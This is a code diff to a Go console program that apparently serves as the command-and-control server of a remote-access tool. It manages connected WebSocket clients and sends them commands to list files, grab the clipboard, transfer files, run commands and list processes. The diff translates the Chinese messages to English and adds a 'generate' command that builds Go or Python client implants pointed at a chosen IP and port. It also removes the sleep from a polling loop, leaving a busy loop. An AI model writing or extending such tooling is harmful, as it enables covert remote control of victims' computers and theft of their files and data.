@@ -4,14 +4,15 @@ import (
 	"encoding/json"
 	"fmt"
 	"net/http"
+	"os"
+	"runtime"
 	"strings"
 	"sync"
-	"time"
 
 	"github.com/chzyer/readline"
 	"github.com/fatih/color"
-	"github.com/gorilla/websocket"
 	"github.com/google/uuid"
+	"github.com/gorilla/websocket"
 )
 
 type Client struct {
@@ -21,11 +22,11 @@ type Client struct {
 }
 
 type ClientManager struct {
-	Clients         map[string]*Client
-	mu              sync.RWMutex
-	addClientChan   chan *Client
+	Clients          map[string]*Client
+	mu               sync.RWMutex
+	addClientChan    chan *Client
 	removeClientChan chan string
-	messageChan     chan Message
+	messageChan      chan Message
 }
 
 type Message struct {
@@ -39,10 +40,10 @@ var availableCommands = []string{
 
 func NewClientManager() *ClientManager {
 	return &ClientManager{
-		Clients:         make(map[string]*Client),
-		addClientChan:   make(chan *Client),
+		Clients:          make(map[string]*Client),
+		addClientChan:    make(chan *Client),
 		removeClientChan: make(chan string),
-		messageChan:     make(chan Message),
+		messageChan:      make(chan Message),
 	}
 }
 
@@ -53,13 +54,13 @@ func (cm *ClientManager) Start() {
 			cm.mu.Lock()
 			cm.Clients[client.UUID] = client
 			cm.mu.Unlock()
-			fmt.Printf("新连接: %s, UUID: %s\n", client.Addr, client.UUID)
+			fmt.Printf("New connection: %s, UUID: %s\n", client.Addr, client.UUID)
 
 		case uuid := <-cm.removeClientChan:
 			cm.mu.Lock()
 			delete(cm.Clients, uuid)
 			cm.mu.Unlock()
-			fmt.Printf("连接关闭: UUID: %s\n", uuid)
+			fmt.Printf("Connection closed: UUID: %s\n", uuid)
 
 		case msg := <-cm.messageChan:
 			cm.mu.RLock()
@@ -67,12 +68,12 @@ func (cm *ClientManager) Start() {
 				response := map[string]string{"command": msg.Content}
 				data, _ := json.Marshal(response)
 				if err := client.Conn.WriteMessage(websocket.TextMessage, data); err != nil {
-					fmt.Printf("发送消息失败: %v\n", err)
+					fmt.Printf("Failed to send message: %v\n", err)
 				} else {
-					fmt.Printf("消息已发送给 UUID: %s, 内容: %s\n", msg.UUID, msg.Content)
+					fmt.Printf("Message sent to UUID: %s, Content: %s\n", msg.UUID, msg.Content)
 				}
 			} else {
-				fmt.Printf("未找到连接: %s\n", msg.UUID)
+				fmt.Printf("Connection not found: %s\n", msg.UUID)
 			}
 			cm.mu.RUnlock()
 		}
@@ -91,7 +92,7 @@ func wsHandler(cm *ClientManager, conn *websocket.Conn) {
 	client := &Client{Conn: conn, UUID: newUUID, Addr: address}
 
 	cm.addClientChan <- client
-	successMessage := map[string]string{"status": "success", "message": "连接成功", "uuid": newUUID}
+	successMessage := map[string]string{"status": "success", "message": "Connection successful", "uuid": newUUID}
 	data, _ := json.Marshal(successMessage)
 	conn.WriteMessage(websocket.TextMessage, data)
 
@@ -101,7 +102,7 @@ func wsHandler(cm *ClientManager, conn *websocket.Conn) {
 			cm.removeClientChan <- newUUID
 			break
 		}
-		fmt.Printf("收到来自 %s 的消息: %s\n", address, message)
+		fmt.Printf("Received message from %s: %s\n", address, message)
 	}
 }
 
@@ -119,6 +120,38 @@ func sendMessageToClient(cm *ClientManager, uuid, message string) {
 	cm.messageChan <- Message{UUID: uuid, Content: message}
 }
 
+func generateClientTemplate(language, ip, port, osType, protocol string) error {
+	var fileExt string
+	switch language {
+	case "go":
+		fileExt = "go"
+	case "python":
+		fileExt = "py"
+	default:
+		return fmt.Errorf("unsupported language: %s", language)
+	}
+
+	templatePath := fmt.Sprintf("client/%s/%s_client.%s", language, protocol, fileExt)
+
+	content, err := os.ReadFile(templatePath)
+	if err != nil {
+		return fmt.Errorf("failed to read template file: %v", err)
+	}
+
+	template := string(content)
+	template = strings.ReplaceAll(template, "{ip}", ip)
+	template = strings.ReplaceAll(template, "{port}", port)
+
+	filename := fmt.Sprintf("client_%s.%s", language, fileExt)
+	err = os.WriteFile(filename, []byte(template), 0644)
+	if err != nil {
+		return fmt.Errorf("failed to write client file: %v", err)
+	}
+
+	fmt.Printf("Client template generated: %s\n", filename)
+	return nil
+}
+
 func printUseCommandHelp() {
 	color.Set(color.FgCyan)
 	fmt.Println("可用命令:")
@@ -130,62 +163,107 @@ func printUseCommandHelp() {
 
 func printHelp() {
 	color.Set(color.FgCyan)
-	fmt.Println("可用命令:")
-	fmt.Println("  http            启动HTTP服务")
-	fmt.Println("  websocket       启动WebSocket服务")
-	fmt.Println("  list websocket  列出所有活动的WebSocket连接")
-	fmt.Println("  use <UUID>     与特定的WebSocket连接交互（通过UUID）")
-	fmt.Println("  help           显示此帮助信息")
+	fmt.Println("Available commands:")
+	fmt.Println("  http            Start HTTP server")
+	fmt.Println("  websocket       Start WebSocket server")
+	fmt.Println("  list websocket  List all active WebSocket connections")
+	fmt.Println("  use <UUID>      Interact with a specific WebSocket connection (by UUID)")
+	fmt.Println("  generate        Generate a client template with options: lang=<go|python> ip=<IP_ADDRESS> port=<PORT> protocol=<ws|wss>")
+	fmt.Println("  help            Show this help information")
 	color.Unset()
 }
 
+func handleGenerateCommand(params []string) {
+	if len(params) == 0 {
+		fmt.Println("Usage: generate lang=<go|python> ip=<IP_ADDRESS> port=<PORT> protocol=<ws|wss>")
+		return
+	}
+
+	language := "go"
+	ip := "127.0.0.1"
+	port := "8081"
+	osType := runtime.GOOS
+	protocol := "ws"
+
+	for _, param := range params {
+		parts := strings.Split(param, "=")
+		if len(parts) != 2 {
+			fmt.Printf("Invalid parameter: %s\n", param)
+			continue
+		}
+		key, value := parts[0], parts[1]
+		switch key {
+		case "lang":
+			language = value
+		case "ip":
+			ip = value
+		case "port":
+			port = value
+		case "os":
+			osType = value
+		case "protocol":
+			protocol = value
+		}
+	}
+
+	err := generateClientTemplate(language, ip, port, osType, protocol)
+	if err != nil {
+		fmt.Printf("Error generating client: %v\n", err)
+	}
+}
+
 func handleUseCommand(cm *ClientManager, uuid string) {
-	if client, exists := cm.Clients[uuid]; exists {
-		config := readline.Config{
-			Prompt: fmt.Sprintf("输入要给 %s 发送的消息 (输入 'back' 或 'bk' 返回): ", client.Conn.RemoteAddr().String()),
-			AutoComplete: readline.NewPrefixCompleter(
-				readline.PcItem("list_files"),
-				readline.PcItem("get_clipboard"),
-				readline.PcItem("download_file"),
-				readline.PcItem("upload_file"),
-				readline.PcItem("execute_command"),
-				readline.PcItem("list_processes"),
-				readline.PcItem("help"),
-			),
-		}
-		rl, err := readline.NewEx(&config)
-		if err != nil {
-			fmt.Println("初始化 readline 失败:", err)
-			return
-		}
-		defer rl.Close()
+	cm.mu.RLock()
+	_, exists := cm.Clients[uuid]
+	cm.mu.RUnlock()
 
-		for {
-			line, err := rl.Readline()
-			if err != nil {
-				break
-			}
-
-			message := strings.TrimSpace(line)
-
-			if message == "back" || message == "bk" {
-				break
-			}
-
-			// Handle special commands
-			switch message {
-			case "list_files", "get_clipboard", "download_file", "upload_file", "execute_command", "list_processes":
-				sendMessageToClient(cm, uuid, message)
-			case "help":
-				printUseCommandHelp()
-			default:
-				sendMessageToClient(cm, uuid, message)
-			}
-		}
-	} else {
+	if !exists {
 		color.Set(color.FgRed)
-		fmt.Println("未找到该连接")
+		fmt.Println("Connection not found")
 		color.Unset()
+		return
+	}
+
+	config := readline.Config{
+		Prompt: fmt.Sprintf("Enter message for %s (or 'back' to return): ", uuid),
+		AutoComplete: readline.NewPrefixCompleter(
+			readline.PcItem("list_files"),
+			readline.PcItem("get_clipboard"),
+			readline.PcItem("download_file"),
+			readline.PcItem("upload_file"),
+			readline.PcItem("execute_command"),
+			readline.PcItem("list_processes"),
+			readline.PcItem("help"),
+		),
+	}
+	rl, err := readline.NewEx(&config)
+	if err != nil {
+		fmt.Println("Failed to initialize readline:", err)
+		return
+	}
+	defer rl.Close()
+
+	for {
+		line, err := rl.Readline()
+		if err != nil {
+			break
+		}
+
+		message := strings.TrimSpace(line)
+
+		if message == "back" || message == "bk" {
+			break
+		}
+
+		// Handle special commands
+		switch message {
+		case "list_files", "get_clipboard", "download_file", "upload_file", "execute_command", "list_processes":
+			sendMessageToClient(cm, uuid, message)
+		case "help":
+			printUseCommandHelp()
+		default:
+			sendMessageToClient(cm, uuid, message)
+		}
 	}
 }
 
@@ -194,40 +272,40 @@ func main() {
 	go cm.Start()
 
 	config := readline.Config{
-		Prompt:       "输入命令: ",
-		HistoryFile:  ".readline.tmp",
+		Prompt:      "Enter command: ",
+		HistoryFile: ".readline.tmp",
 		AutoComplete: readline.NewPrefixCompleter(
 			readline.PcItem("http"),
 			readline.PcItem("websocket"),
 			readline.PcItem("list", readline.PcItem("websocket")),
 			readline.PcItem("use"),
+			readline.PcItem("generate"),
 			readline.PcItem("help"),
 		),
 	}
 
 	rl, err := readline.NewEx(&config)
 	if err != nil {
-		fmt.Println("初始化 readline 失败:", err)
+		fmt.Println("Failed to initialize readline:", err)
 		return
 	}
 	defer rl.Close()
 
-	// Tab 补全功能
 	go func() {
 		for {
 			uuids := listClients(cm)
-			completers := make([]readline.PrefixCompleterInterface, len(uuids))
-			for i, id := range uuids {
-				completers[i] = readline.PcItem(id)
+			var completers []readline.PrefixCompleterInterface
+			for _, uuid := range uuids {
+				completers = append(completers, readline.PcItem(uuid))
 			}
 			rl.Config.AutoComplete = readline.NewPrefixCompleter(
 				readline.PcItem("http"),
 				readline.PcItem("websocket"),
 				readline.PcItem("list", readline.PcItem("websocket")),
 				readline.PcItem("use", completers...),
+				readline.PcItem("generate"),
 				readline.PcItem("help"),
 			)
-			time.Sleep(time.Second) // 每秒更新一次
 		}
 	}()
 
@@ -237,43 +315,55 @@ func main() {
 			break
 		}
 
-		command := strings.TrimSpace(line)
+		command := strings.Fields(line)
+		if len(command) == 0 {
+			continue
+		}
 
-		switch {
-		case strings.HasPrefix(command, "use "):
-			uuid := strings.TrimSpace(strings.TrimPrefix(command, "use "))
-			handleUseCommand(cm, uuid)
-		case command == "http":
+		switch command[0] {
+		case "use":
+			if len(command) > 1 {
+				handleUseCommand(cm, command[1])
+			} else {
+				fmt.Println("Usage: use <UUID>")
+			}
+		case "http":
 			go http.ListenAndServe(":8080", http.HandlerFunc(httpHandler))
 			color.Set(color.FgYellow)
-			fmt.Println("HTTP服务已启动在8080端口")
+			fmt.Println("HTTP server started on port 8080")
 			color.Unset()
-		case command == "websocket":
+		case "websocket":
 			http.HandleFunc("/ws", func(w http.ResponseWriter, r *http.Request) {
 				upgrader := websocket.Upgrader{}
 				upgrader.CheckOrigin = func(r *http.Request) bool { return true }
 				conn, err := upgrader.Upgrade(w, r, nil)
 				if err != nil {
-					fmt.Println("升级到WebSocket失败:", err)
+					fmt.Println("Failed to upgrade to WebSocket:", err)
 					return
 				}
 				wsHandler(cm, conn)
 			})
 			go http.ListenAndServe(":8081", nil)
 			color.Set(color.FgYellow)
-			fmt.Println("WebSocket服务已启动在8081端口")
+			fmt.Println("WebSocket server started on port 8081")
 			color.Unset()
-		case command == "list websocket":
-			uuids := listClients(cm)
-			fmt.Println("活动的WebSocket会话:")
-			for _, uuid := range uuids {
-				fmt.Println("UUID:", uuid)
+		case "list":
+			if len(command) > 1 && command[1] == "websocket" {
+				uuids := listClients(cm)
+				fmt.Println("Active WebSocket sessions:")
+				for _, uuid := range uuids {
+					fmt.Println("UUID:", uuid)
+				}
+			} else {
+				fmt.Println("Usage: list websocket")
 			}
-		case command == "help":
+		case "generate":
+			handleGenerateCommand(command[1:])
+		case "help":
 			printHelp()
 		default:
 			color.Set(color.FgRed)
-			fmt.Println("无效命令，请重新输入.")
+			fmt.Println("Invalid command, please try again.")
 			color.Unset()
 		}
 	}
